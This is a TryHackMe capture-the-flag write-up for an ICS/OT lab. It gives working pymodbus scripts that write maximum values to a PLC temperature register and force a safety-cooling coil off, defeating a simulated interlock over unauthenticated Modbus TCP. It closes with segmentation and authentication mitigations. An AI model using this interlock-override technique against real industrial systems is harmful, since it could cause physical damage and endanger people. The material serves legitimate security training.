# [Kaboom](https://tryhackme.com/room/kaboom) - TryHackMe CTF Writeup
### TryHackMe · ICS/OT Security · Kaboom

> **Author:** [George Giannakidis](https://github.com/georgegiannakidis)  
> **AI assistant used:** Claude (Anthropic)  
> **Platform:** TryHackMe  
> **Room:** [Kaboom](https://tryhackme.com/room/kaboom)  
> **Category:** ICS / OT · SCADA · Modbus  
> **Difficulty:** Medium  
> **Flag:** `THM{[REDACTED]}` _(withheld per TryHackMe policy)_  
> **AI vs AI:** Industrial control system breach — defeat a PLC safety interlock over unauthenticated Modbus TCP to trigger a simulated explosion and reveal the flag.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Surface Analysis](#2-surface-analysis)
   - [The CCTV Simulator (Port 80)](#21-the-cctv-simulator-port-80)
   - [Red Herrings](#22-red-herrings)
3. [Exploitation](#3-exploitation)
   - [Enumerating Modbus](#31-enumerating-modbus)
   - [Maxing the Temperature](#32-maxing-the-temperature)
   - [Defeating the Safety Interlock](#33-defeating-the-safety-interlock)
4. [Flag Extraction](#4-flag-extraction)
5. [Conclusion](#5-conclusion)

---

## 1. Reconnaissance

**Severity:** Informational  
**Location:** Target host, full TCP scan

An initial `nmap` scan reveals a textbook ICS/OT stack.

#### Code Blocks

```bash
nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>
```

#### Tables

| Port  | Service          | Version / Detail                              | Notes                                          |
|-------|------------------|-----------------------------------------------|------------------------------------------------|
| 22    | SSH              | OpenSSH 9.6p1 (Ubuntu)                         | No creds — not the path                        |
| 80    | HTTP             | Werkzeug 3.1.3 / Python 3.12.3                 | "PLC CCTV Simulator" — live video feed         |
| 102   | iso-tsap (S7)    | Siemens S7 PLC, CPU 315-2 PN/DP, SNAP7-SERVER  | Simulated Siemens PLC                          |
| 502   | **Modbus (mbap)**| —                                             | **Unauthenticated — the real attack surface**  |
| 1880  | Node-RED         | OpenJS / Node-RED editor                       | Reachable (red herring)                        |
| 8080  | http-proxy       | Werkzeug 2.3.7 / Python 3.12.3 — Flask login   | Redirects to `/login` (red herring)            |
| 44818 | EtherNet/IP      | EtherNetIP-2                                   | ICS discovery protocol                         |

#### Raw Scan Output (key sections)

```text
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http          Werkzeug/3.1.3 Python/3.12.3
|_http-title: PLC CCTV Simulator
102/tcp   open  iso-tsap      Siemens S7 PLC
| s7-info:
|   Module: 6ES7 315-2EH14-0AB0
|   Version: 3.2.6
|   System Name: SNAP7-SERVER
|   Module Type: CPU 315-2 PN/DP
|_  Copyright: Original Siemens Equipment
502/tcp   open  mbap?
1880/tcp  open  vsat-control?   (Node-RED editor — OpenJS Foundation)
8080/tcp  open  http-proxy    Werkzeug/2.3.7 Python/3.12.3
|_Requested resource was /login
44818/tcp open  EtherNetIP-2?
Service Info: OS: Linux; Device: specialized
```

> **Key reads:** `502/mbap` = Modbus, no auth. The S7 banner, EtherNet/IP, and Node-RED
> all scream "ICS lab". Two Flask apps (Werkzeug) on 80 and 8080.

---

## 2. Surface Analysis

### 2.1. The CCTV Simulator (Port 80)

**Severity:** Informational  
**Location:** `http://<TARGET_IP>/`

The web page is a "PLC CCTV Simulator" that polls a backend for state and swaps the
displayed video based on the PLC's physical condition.

#### Code Blocks

```js
async function getPLCVideo() {
  const res = await fetch('/api/state');
  return await res.json();
}
// video src = `/video?mode=${video}`
```

Querying the state endpoint directly:

```bash
curl -s http://<TARGET_IP>/api/state
```

```json
{ "status": "Normal", "video": "default" }
```

The web UI is **only a viewer** for the PLC state. To change what it displays, we
must change the PLC itself — over Modbus.

### 2.2. Red Herrings

**Severity:** Note  
**Location:** Ports 1880, 8080

> *"The shiny services are the trap. The simplest unauthenticated protocol is the door."*
> *- ICS pentest wisdom*

| Service          | Tested                                              | Result    |
|------------------|-----------------------------------------------------|-----------|
| OpenPLC (8080)   | Default creds `openplc:openplc`, `admin:admin`, etc.| All failed |
| Node-RED (1880)  | `/flows` API, `/auth/token` with `admin:password`   | Auth blocked |

Neither is the intended path. Move on to Modbus.

---

## 3. Exploitation

### 3.1. Enumerating Modbus

**Severity:** Critical  
**Location:** `<TARGET_IP>:502`

Modbus TCP has **no authentication** by design. Using `pymodbus`:

```bash
pip install pymodbus
```

```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient('<TARGET_IP>', port=502)
c.connect()

print("HOLDING:", c.read_holding_registers(0, count=10).registers)
print("COILS:",   c.read_coils(0, count=20).bits)
c.close()
```

**Findings:**

| Object                | Observation                          | Meaning              |
|-----------------------|--------------------------------------|----------------------|
| Holding register 0    | Fluctuates around `56`               | **Temperature**      |
| Coils                 | All `False` initially                | Control bits idle    |

### 3.2. Maxing the Temperature

**Severity:** High  
**Location:** Holding register 0

Write the temperature register to its maximum value:

```python
c.write_register(0, 65535)   # max out temperature
```

Re-check the web state:

```json
{ "status": "High Temperature, Cooling ON", "video": "cooling" }
```

The PLC reacts — but a **safety interlock engages**. Re-reading shows the
temperature *dropping* (`65535 → 65487 → ...`) and a new coil flips on:

```python
COILS: [..., index 15 = True, ...]   # COIL 15 = Cooling System
```

The cooling system (coil 15) automatically pulls the temperature back down. A
single write is not enough — the PLC keeps saving itself.

### 3.3. Defeating the Safety Interlock

**Severity:** Critical  
**Location:** Holding register 0 + Coil 15

To force an explosion, **hold the temperature maxed while forcing the cooling coil
OFF** — faster than the PLC scan cycle can re-engage it.

```python
from pymodbus.client import ModbusTcpClient
import time, urllib.request

c = ModbusTcpClient('<TARGET_IP>', port=502)
c.connect()

for _ in range(5):
    c.write_register(0, 65535)   # pin temperature at max
    c.write_coil(15, False)      # force cooling OFF
    time.sleep(0.5)

print("HOLD[0]:", c.read_holding_registers(0, count=1).registers)
print("COIL15:",  c.read_coils(15, count=1).bits[0])
c.close()

state = urllib.request.urlopen("http://<TARGET_IP>/api/state").read().decode()
print("STATE:", state)
```

Output:

```text
HOLD[0]: [3000]
COIL15: False
STATE: {
  "status": "Explosion Detected!",
  "video": "explodedflag23"
}
```

The safety lost the race — **`Explosion Detected!`** and a new video mode appears:
`explodedflag23`.

---

## 4. Flag Extraction

**Severity:** High  
**Location:** `/video?mode=explodedflag23`

The explosion video name hints the flag is inside. Download it and extract frames —
the flag is **rendered on-screen**, not in metadata.

```bash
curl -s "http://<TARGET_IP>/video?mode=explodedflag23" -o flag.mp4

# strings yields nothing — flag is drawn in the frames
ffmpeg -i flag.mp4 -vf fps=2 f_%03d.png
xdg-open f_001.png
```

The opening frames of the explosion clip show the flag overlaid on the fireball — in
the format `THM{...}`.

> The flag itself is withheld in line with TryHackMe's write-up policy. Trigger the
> explosion state yourself and extract the frame to retrieve it.

---

## 5. Conclusion

| Label            | Detail                                                                 |
|------------------|------------------------------------------------------------------------|
| **Vector**       | Unauthenticated Modbus TCP (port 502)                                   |
| **Root Cause**   | No auth on Modbus + safety interlock controllable by attacker          |
| **Technique**    | Register/coil manipulation; race the PLC scan cycle to defeat cooling  |
| **Impact**       | Full override of physical process safety → simulated explosion         |
| **Flag**         | `THM{...}` — withheld per TryHackMe write-up policy                     |

**Key takeaways:**

- ICS/OT attacks target **process logic, not credentials** — no login was ever needed.
- **Modbus is unauthenticated by design**; network reach equals read/write control.
- **Safety interlocks are just coils** — if writable, the safety becomes attacker-controlled.
- **Don't chase shiny services** — OpenPLC and Node-RED were deliberate distractions.
- **Real-world mitigation:** segment OT networks, never expose Modbus/S7/EtherNet-IP to
  untrusted networks, enforce read-only / authenticated gateways.

**Tools used:** `nmap` · `pymodbus` · `curl` · `ffmpeg`

> **AI assistance:** Claude (Anthropic) was used as a coding assistant to help write and
> debug the `pymodbus` scripts. All recon, exploitation decisions, and verification were
> performed and validated by the author.

---

*Written by [George Giannakidis](https://github.com/georgegiannakidis) · 2026-06-27*  
*Coding assistance: Claude (Anthropic)*  
*TryHackMe · ICS/OT Security · Kaboom*  
*Flag withheld per TryHackMe policy · [Room: Kaboom](https://tryhackme.com/room/kaboom)*
